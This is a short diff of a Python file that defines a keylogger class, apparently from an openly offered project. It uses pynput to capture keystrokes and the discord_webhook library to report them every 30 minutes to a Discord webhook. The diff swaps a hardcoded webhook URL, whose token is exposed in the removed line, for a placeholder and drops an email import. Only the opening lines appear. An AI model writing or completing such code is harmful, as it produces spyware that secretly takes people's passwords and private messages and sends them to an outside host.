@@ -1,12 +1,11 @@
 #!/usr/bin/env python
 import os
-import smtplib
 import threading
 import pynput
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from pynput import keyboard
 
-WEBHOOK = "https://discord.com/api/webhooks/937074392691789924/32S2tgJzk4KpK-MS_1QsZUeHq-uzrdUQm5aNB1RbCT3kBV40dNVHbIISntVU2aqto-n1"
+WEBHOOK = "WEBHOOK_URL"
 class Keylogger:
     def __init__(self, time_interval=1800, report_method="webhook"):
         self.log = "Keylogger Started"
